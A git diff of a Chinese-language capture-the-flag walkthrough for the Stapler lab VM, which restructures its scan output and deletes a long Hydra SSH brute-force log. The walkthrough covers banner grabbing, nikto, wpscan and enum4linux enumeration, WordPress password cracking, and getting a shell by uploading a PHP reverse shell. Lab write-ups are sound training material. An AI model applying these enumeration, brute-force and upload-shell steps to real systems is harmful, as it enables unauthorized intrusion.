@@ -256,9 +256,12 @@ ftp: Login failed
 ftp>
 ```
 </details>
-总之，通过FTP并未找到有用的信息，只得到了一些用户名信息：john、elly、harry；这很让我怀疑，难道要用暴力破解？？？
+总之，通过FTP并未找到有用的信息，只能通过banner信息得到了一些用户名信息：john、elly、harry；这很让我怀疑，难道要用暴力破解？？？
 
 ## SSH
+<details>
+<summary>ssh登录一下，看有没有有用的banner信息</summary>
+
 ```shell
 ┌──(root㉿kali)-[~]
 └─# ssh john@192.168.0.152
@@ -295,9 +298,13 @@ Permission denied, please try again.
 harry@192.168.0.152's password:
 harry@192.168.0.152: Permission denied (publickey,password).
 ```
-新增用户名为barry，目前的用户名列表是：john、elly、harry、barry，而且barry应该是用密钥登录。
+</details>
+现在，通过SSH的banner信息，得到新增用户名为barry，目前的用户名列表是：john、elly、harry、barry，而且barry应该是用密钥登录。
 
 ## web
+<details>
+<summary>通过nikto简单扫描一下，80和12380端口</summary>
+
 ```shell
 ┌──(root㉿kali)-[/stapler]
 └─# cat nikto.txt
@@ -332,15 +339,20 @@ harry@192.168.0.152: Permission denied (publickey,password).
 + OSVDB-3233: GET /icons/README: Apache default file found.
 + GET /phpmyadmin/: phpMyAdmin directory found
 ```
-</pre>
 </details>
-
+可以看到：
+1. 12380使用的是https访问；
+2. 12380端口中的robots.txt，有两个目录/admin112233/、/blogblog/、/phpmyadmin/；
+3. 遗憾的是phpmyadmin不是默认的用户名和密码，不能登录；
+没有办法，只能浏览器看一下页面：
 <img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/1.png" width="56%"></br>
 得到两个用户名：tim、zoe
 访问web页面https://192.168.0.150:12380/blogblog/：
 <img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/2.png" width="56%"></br>
-
 看到wordpress后，使用wpscan跑一下：</br>
+
+<details>
+<summary>wpscan扫描结果</summary>
 
 ```shell
 ┌──(root㉿kali)-[/stapler]
@@ -522,7 +534,13 @@ Interesting Finding(s):
 [+] Memory used: 535.461 MB
 [+] Elapsed time: 00:03:04
 ```
-得到一堆用户:barry,garry,harry,scott,kathy,tim,elly,john,peter,heather
+</details>
+
+通过扫描结果我们得到一下信息：
+1. xml-rpc: https://192.168.0.150:12380/blogblog/xmlrpc.php;
+2. 上传目录: https://192.168.0.150:12380/blogblog/wp-content/uploads/
+3. advanced-video-embed-embed-videos-or-playlists插件
+4. wordpress的一些用户名：barry,garry,harry,scott,kathy,tim,elly,john,peter,heather
 破解一下密码试试：
 ```shell
 ┌──(root㉿kali)-[/stapler]
@@ -536,44 +554,28 @@ Interesting Finding(s):
 [SUCCESS] - john / incorrect
 ```
 ## SMB
-枚举共享目录
+<details>
+<summary>枚举共享目录</summary>
+
 ```shell
 ┌──(root㉿kali)-[/stapler]
 └─# enum4linux -S 192.168.0.150
 Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jul  4 09:16:41 2022
-
  =========================================( Target Information )=========================================
-
 Target ........... 192.168.0.150
 RID Range ........ 500-550,1000-1050
 Username ......... ''
 Password ......... ''
 Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
-
-
  ===========================( Enumerating Workgroup/Domain on 192.168.0.150 )===========================
-
-
 [+] Got domain/workgroup name: WORKGROUP
-
-
  ===================================( Session Check on 192.168.0.150 )===================================
-
-
 [+] Server 192.168.0.150 allows sessions using username '', password ''
-
-
  ================================( Getting domain SID for 192.168.0.150 )================================
-
 Domain Name: WORKGROUP
 Domain Sid: (NULL SID)
-
 [+] Can't determine if host is part of domain or part of a workgroup
-
-
  =================================( Share Enumeration on 192.168.0.150 )=================================
-
-
 	Sharename       Type      Comment
 	---------       ----      -------
 	print$          Disk      Printer Drivers
@@ -581,81 +583,55 @@ Domain Sid: (NULL SID)
 	tmp             Disk      All temporary files should be stored here
 	IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
 Reconnecting with SMB1 for workgroup listing.
-
 	Server               Comment
 	---------            -------
-
 	Workgroup            Master
 	---------            -------
 	WORKGROUP            RED
-
 [+] Attempting to map shares on 192.168.0.150
-
 //192.168.0.150/print$	Mapping: DENIED Listing: N/A Writing: N/A
 //192.168.0.150/kathy	Mapping: OK Listing: OK Writing: N/A
 //192.168.0.150/tmp	Mapping: OK Listing: OK Writing: N/A
-
 [E] Can't understand response:
-
 NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
 //192.168.0.150/IPC$	Mapping: N/A Listing: N/A Writing: N/A
 enum4linux complete on Mon Jul  4 09:16:41 2022
 ```
-枚举用户名：
+</details>
+
+<details>
+<summary>枚举用户名</summary>
+
 ```shell
 ┌──(root㉿kali)-[/stapler]
 └─# enum4linux -r 192.168.0.150
 Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jul  4 09:18:46 2022
-
  =========================================( Target Information )=========================================
-
 Target ........... 192.168.0.150
 RID Range ........ 500-550,1000-1050
 Username ......... ''
 Password ......... ''
 Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
-
-
  ===========================( Enumerating Workgroup/Domain on 192.168.0.150 )===========================
-
-
 [+] Got domain/workgroup name: WORKGROUP
-
-
  ===================================( Session Check on 192.168.0.150 )===================================
-
-
 [+] Server 192.168.0.150 allows sessions using username '', password ''
-
-
  ================================( Getting domain SID for 192.168.0.150 )================================
-
 Domain Name: WORKGROUP
 Domain Sid: (NULL SID)
-
 [+] Can't determine if host is part of domain or part of a workgroup
-
-
  ==================( Users on 192.168.0.150 via RID cycling (RIDS: 500-550,1000-1050) )==================
-
-
 [I] Found new SID:
 S-1-22-1
-
 [I] Found new SID:
 S-1-5-32
-
 [I] Found new SID:
 S-1-5-32
-
 [I] Found new SID:
 S-1-5-32
-
 [I] Found new SID:
 S-1-5-32
-
 [+] Enumerating users using SID S-1-5-32 and logon username '', password ''
-
 S-1-5-32-544 BUILTIN\Administrators (Local Group)
 S-1-5-32-545 BUILTIN\Users (Local Group)
 S-1-5-32-546 BUILTIN\Guests (Local Group)
@@ -663,9 +639,7 @@ S-1-5-32-547 BUILTIN\Power Users (Local Group)
 S-1-5-32-548 BUILTIN\Account Operators (Local Group)
 S-1-5-32-549 BUILTIN\Server Operators (Local Group)
 S-1-5-32-550 BUILTIN\Print Operators (Local Group)
-
 [+] Enumerating users using SID S-1-22-1 and logon username '', password ''
-
 S-1-22-1-1000 Unix User\peter (Local User)
 S-1-22-1-1001 Unix User\RNunemaker (Local User)
 S-1-22-1-1002 Unix User\ETollefson (Local User)
@@ -696,16 +670,16 @@ S-1-22-1-1026 Unix User\zoe (Local User)
 S-1-22-1-1027 Unix User\NATHAN (Local User)
 S-1-22-1-1028 Unix User\www (Local User)
 S-1-22-1-1029 Unix User\elly (Local User)
-
 [+] Enumerating users using SID S-1-5-21-864226560-67800430-3082388513 and logon username '', password ''
-
 S-1-5-21-864226560-67800430-3082388513-501 RED\nobody (Local User)
 S-1-5-21-864226560-67800430-3082388513-513 RED\None (Domain Group)
 enum4linux complete on Mon Jul  4 09:19:00 2022
 ```
+</details>
+
 # Vulnerability Analysis
 通过信息收集我们得到的可攻击的点是：
-1. 通过FTP、SMB、web服务我们收集到很多的用户名列表：
+1. 通过FTP、SMB、web、SMB服务我们收集到很多的用户名列表：
 ```shell
 ┌──(root㉿kali)-[/stapler]
 └─# cat username.txt
@@ -770,6 +744,7 @@ john/incorrect(web管理员，可以上传文件)
 
 # Exploitation
 ## 1. 通过john/incorrect获取shell
+通过wordpress的上传插件功能，虽然最后需要FTP账号，但是文件成功上传到上传目录：https://192.168.0.150:12380/blogblog/wp-content/uploads/，我们上传一个php-reverse-shell.php，然后在访问这个php文件，可以成功获得一个shell：
 <img src="https://github.com/eagleatman/mywriteup/blob/main/stapler/images/3.png" width="56%"></br>
 ```shell
 ┌──(root㉿kali)-[/stapler]
@@ -811,395 +786,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-04 09:39:
 [ATTEMPT] target 192.168.0.150 - login "root" - pass "" - 14 of 150 [child 13] (0/0)
 [ATTEMPT] target 192.168.0.150 - login "root" - pass "toor" - 15 of 150 [child 14] (0/0)
 [ATTEMPT] target 192.168.0.150 - login "daemon" - pass "daemon" - 16 of 150 [child 15] (0/0)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Disabled child 12 because of too many errors
-[VERBOSE] Disabled child 15 because of too many errors
-[ATTEMPT] target 192.168.0.150 - login "daemon" - pass "" - 17 of 152 [child 7] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "daemon" - pass "nomead" - 18 of 152 [child 11] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "bin" - pass "bin" - 19 of 152 [child 6] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "bin" - pass "" - 20 of 152 [child 0] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "bin" - pass "nib" - 21 of 152 [child 10] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "sys" - pass "sys" - 22 of 152 [child 2] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "sys" - pass "" - 23 of 152 [child 9] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "sync" - pass "sync" - 25 of 152 [child 1] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "sync" - pass "" - 26 of 152 [child 8] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 8
-[ATTEMPT] target 192.168.0.150 - login "sync" - pass "cnys" - 27 of 152 [child 14] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "games" - pass "games" - 28 of 152 [child 3] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "games" - pass "" - 29 of 152 [child 4] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "games" - pass "semag" - 30 of 152 [child 5] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "games" - pass "" - 30 of 152 [child 8] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 3
-[VERBOSE] Retrying connection for child 8
-[ATTEMPT] target 192.168.0.150 - login "man" - pass "man" - 31 of 152 [child 13] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 13
-[RE-ATTEMPT] target 192.168.0.150 - login "man" - pass "games" - 31 of 152 [child 3] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "man" - pass "" - 31 of 152 [child 8] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "man" - pass "man" - 31 of 152 [child 13] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 13
-[RE-ATTEMPT] target 192.168.0.150 - login "man" - pass "man" - 31 of 152 [child 13] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 13
-[RE-ATTEMPT] target 192.168.0.150 - login "man" - pass "man" - 31 of 152 [child 13] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "man" - pass "" - 32 of 152 [child 11] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 11
-[ATTEMPT] target 192.168.0.150 - login "man" - pass "nam" - 33 of 152 [child 6] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 6
-[RE-ATTEMPT] target 192.168.0.150 - login "man" - pass "" - 33 of 152 [child 11] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "lp" - pass "lp" - 34 of 152 [child 0] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 0
-[RE-ATTEMPT] target 192.168.0.150 - login "lp" - pass "nam" - 34 of 152 [child 6] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "lp" - pass "" - 35 of 152 [child 10] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[ATTEMPT] target 192.168.0.150 - login "lp" - pass "pl" - 36 of 152 [child 9] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "lp" - pass "lp" - 36 of 152 [child 0] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "mail" - pass "mail" - 37 of 152 [child 1] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "mail" - pass "" - 38 of 152 [child 2] (0/2)
-[VERBOSE] Retrying connection for child 10
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 1
-[RE-ATTEMPT] target 192.168.0.150 - login "mail" - pass "" - 38 of 152 [child 10] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[RE-ATTEMPT] target 192.168.0.150 - login "mail" - pass "mail" - 38 of 152 [child 1] (0/2)
-[VERBOSE] Retrying connection for child 10
-[ATTEMPT] target 192.168.0.150 - login "mail" - pass "liam" - 39 of 152 [child 7] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "mail" - pass "" - 39 of 152 [child 10] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "news" - pass "news" - 40 of 152 [child 14] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "news" - pass "" - 41 of 152 [child 5] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "news" - pass "swen" - 42 of 152 [child 8] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[ERROR] ssh protocol error
-[ATTEMPT] target 192.168.0.150 - login "uucp" - pass "uucp" - 43 of 152 [child 3] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "uucp" - pass "" - 44 of 152 [child 4] (0/2)
-[VERBOSE] Retrying connection for child 5
-[VERBOSE] Retrying connection for child 8
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 3
-[RE-ATTEMPT] target 192.168.0.150 - login "uucp" - pass "" - 44 of 152 [child 5] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "uucp" - pass "swen" - 44 of 152 [child 8] (0/2)
-[ERROR] could not connect to target port 22: Socket error: disconnected
-[ERROR] ssh protocol error
-[RE-ATTEMPT] target 192.168.0.150 - login "uucp" - pass "uucp" - 44 of 152 [child 3] (0/2)
-[VERBOSE] Retrying connection for child 8
-[ATTEMPT] target 192.168.0.150 - login "uucp" - pass "pcuu" - 45 of 152 [child 13] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "uucp" - pass "swen" - 45 of 152 [child 8] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "nobody" - pass "nobody" - 46 of 152 [child 11] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "nobody" - pass "" - 47 of 152 [child 4] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "nobody" - pass "ydobon" - 48 of 152 [child 6] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "tim" - pass "tim" - 49 of 152 [child 0] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "tim" - pass "" - 50 of 152 [child 2] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "tim" - pass "mit" - 51 of 152 [child 9] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "zoe" - pass "zoe" - 52 of 152 [child 1] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "zoe" - pass "" - 53 of 152 [child 7] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "zoe" - pass "eoz" - 54 of 152 [child 10] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "garry" - pass "garry" - 55 of 152 [child 14] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "garry" - pass "" - 56 of 152 [child 5] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "garry" - pass "yrrag" - 57 of 152 [child 8] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "scott" - pass "scott" - 58 of 152 [child 3] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "scott" - pass "" - 59 of 152 [child 13] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "scott" - pass "ttocs" - 60 of 152 [child 11] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "kathy" - pass "kathy" - 61 of 152 [child 4] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "kathy" - pass "" - 62 of 152 [child 6] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "kathy" - pass "yhtak" - 63 of 152 [child 0] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "peter" - pass "peter" - 64 of 152 [child 2] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 2
-[ATTEMPT] target 192.168.0.150 - login "peter" - pass "" - 65 of 152 [child 9] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[RE-ATTEMPT] target 192.168.0.150 - login "peter" - pass "peter" - 65 of 152 [child 2] (0/2)
-[VERBOSE] Retrying connection for child 9
-[ATTEMPT] target 192.168.0.150 - login "peter" - pass "retep" - 66 of 152 [child 1] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "peter" - pass "" - 66 of 152 [child 9] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 9
-[ATTEMPT] target 192.168.0.150 - login "heather" - pass "heather" - 67 of 152 [child 14] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 14
-[RE-ATTEMPT] target 192.168.0.150 - login "heather" - pass "" - 67 of 152 [child 9] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[ATTEMPT] target 192.168.0.150 - login "heather" - pass "" - 68 of 152 [child 5] (0/2)
-[VERBOSE] Retrying connection for child 9
-[RE-ATTEMPT] target 192.168.0.150 - login "heather" - pass "heather" - 68 of 152 [child 14] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "heather" - pass "rehtaeh" - 69 of 152 [child 7] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 7
-[RE-ATTEMPT] target 192.168.0.150 - login "heather" - pass "" - 69 of 152 [child 9] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "RNunemaker" - pass "RNunemaker" - 70 of 152 [child 10] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 10
-[RE-ATTEMPT] target 192.168.0.150 - login "RNunemaker" - pass "rehtaeh" - 70 of 152 [child 7] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "RNunemaker" - pass "RNunemaker" - 70 of 152 [child 10] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "RNunemaker" - pass "" - 71 of 152 [child 8] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[ATTEMPT] target 192.168.0.150 - login "RNunemaker" - pass "rekamenuNR" - 72 of 152 [child 3] (0/2)
-[VERBOSE] Retrying connection for child 8
-[ATTEMPT] target 192.168.0.150 - login "ETollefson" - pass "ETollefson" - 73 of 152 [child 13] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "ETollefson" - pass "" - 73 of 152 [child 8] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 8
-[RE-ATTEMPT] target 192.168.0.150 - login "ETollefson" - pass "" - 73 of 152 [child 8] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 8
-[RE-ATTEMPT] target 192.168.0.150 - login "ETollefson" - pass "" - 73 of 152 [child 8] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 8
-[RE-ATTEMPT] target 192.168.0.150 - login "ETollefson" - pass "" - 73 of 152 [child 8] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "ETollefson" - pass "" - 74 of 152 [child 11] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "ETollefson" - pass "nosfelloTE" - 75 of 152 [child 4] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 4
-[ATTEMPT] target 192.168.0.150 - login "DSwanger" - pass "DSwanger" - 76 of 152 [child 6] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "DSwanger" - pass "nosfelloTE" - 76 of 152 [child 4] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "DSwanger" - pass "" - 77 of 152 [child 9] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 9
-[ATTEMPT] target 192.168.0.150 - login "DSwanger" - pass "regnawSD" - 78 of 152 [child 10] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "AParnell" - pass "AParnell" - 79 of 152 [child 7] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "AParnell" - pass "" - 79 of 152 [child 9] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 9
-[ATTEMPT] target 192.168.0.150 - login "AParnell" - pass "" - 80 of 152 [child 13] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "AParnell" - pass "llenraPA" - 81 of 152 [child 3] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "AParnell" - pass "" - 81 of 152 [child 9] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "SHayslett" - pass "SHayslett" - 82 of 152 [child 0] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 0
-[ATTEMPT] target 192.168.0.150 - login "SHayslett" - pass "" - 83 of 152 [child 2] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "SHayslett" - pass "SHayslett" - 83 of 152 [child 0] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "SHayslett" - pass "ttelsyaHS" - 84 of 152 [child 8] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "MBassin" - pass "MBassin" - 85 of 152 [child 14] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 14
-[ATTEMPT] target 192.168.0.150 - login "MBassin" - pass "" - 86 of 152 [child 5] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "MBassin" - pass "MBassin" - 86 of 152 [child 14] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 14
-[ATTEMPT] target 192.168.0.150 - login "MBassin" - pass "nissaBM" - 87 of 152 [child 1] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "MBassin" - pass "MBassin" - 87 of 152 [child 14] (0/2)
-[22][ssh] host: 192.168.0.150   login: SHayslett   password: SHayslett
-[ATTEMPT] target 192.168.0.150 - login "JBare" - pass "JBare" - 88 of 152 [child 0] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "JBare" - pass "" - 89 of 152 [child 11] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "JBare" - pass "eraBJ" - 90 of 152 [child 6] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "LSolum" - pass "LSolum" - 91 of 152 [child 4] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 4
-[ATTEMPT] target 192.168.0.150 - login "LSolum" - pass "" - 92 of 152 [child 10] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[RE-ATTEMPT] target 192.168.0.150 - login "LSolum" - pass "LSolum" - 92 of 152 [child 4] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "LSolum" - pass "muloSL" - 93 of 152 [child 7] (0/2)
-[VERBOSE] Retrying connection for child 10
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 7
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 4
-[RE-ATTEMPT] target 192.168.0.150 - login "LSolum" - pass "" - 93 of 152 [child 10] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "LSolum" - pass "muloSL" - 93 of 152 [child 7] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "LSolum" - pass "LSolum" - 93 of 152 [child 4] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "IChadwick" - pass "IChadwick" - 94 of 152 [child 13] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[ATTEMPT] target 192.168.0.150 - login "IChadwick" - pass "" - 95 of 152 [child 3] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "IChadwick" - pass "kciwdahCI" - 96 of 152 [child 9] (0/2)
-[VERBOSE] Retrying connection for child 13
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 9
-[ATTEMPT] target 192.168.0.150 - login "MFrei" - pass "MFrei" - 97 of 152 [child 8] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "MFrei" - pass "IChadwick" - 97 of 152 [child 13] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[RE-ATTEMPT] target 192.168.0.150 - login "MFrei" - pass "kciwdahCI" - 97 of 152 [child 9] (0/2)
-[VERBOSE] Retrying connection for child 13
-[ATTEMPT] target 192.168.0.150 - login "MFrei" - pass "" - 98 of 152 [child 2] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "MFrei" - pass "IChadwick" - 98 of 152 [child 13] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 13
-[ATTEMPT] target 192.168.0.150 - login "MFrei" - pass "ierFM" - 99 of 152 [child 5] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 5
-[RE-ATTEMPT] target 192.168.0.150 - login "MFrei" - pass "IChadwick" - 99 of 152 [child 13] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "SStroud" - pass "SStroud" - 100 of 152 [child 14] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "SStroud" - pass "" - 101 of 152 [child 1] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "SStroud" - pass "ierFM" - 101 of 152 [child 5] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 5
-[RE-ATTEMPT] target 192.168.0.150 - login "SStroud" - pass "ierFM" - 101 of 152 [child 5] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "SStroud" - pass "duortSS" - 102 of 152 [child 11] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 11
-[RE-ATTEMPT] target 192.168.0.150 - login "SStroud" - pass "duortSS" - 102 of 152 [child 11] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 11
-[ATTEMPT] target 192.168.0.150 - login "CCeaser" - pass "CCeaser" - 103 of 152 [child 0] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 0
-[RE-ATTEMPT] target 192.168.0.150 - login "CCeaser" - pass "duortSS" - 103 of 152 [child 11] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 11
-[RE-ATTEMPT] target 192.168.0.150 - login "CCeaser" - pass "CCeaser" - 103 of 152 [child 0] (0/2)
-[RE-ATTEMPT] target 192.168.0.150 - login "CCeaser" - pass "duortSS" - 103 of 152 [child 11] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "CCeaser" - pass "" - 104 of 152 [child 6] (0/2)
-[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
-[ERROR] ssh protocol error
-[VERBOSE] Retrying connection for child 6
-[RE-ATTEMPT] target 192.168.0.150 - login "CCeaser" - pass "" - 104 of 152 [child 6] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "CCeaser" - pass "resaeCC" - 105 of 152 [child 10] (0/2)
-[ATTEMPT] target 192.168.0.150 - login "JKanode" - pass "JKanode" - 106 of 152 [child 7] (0/2)
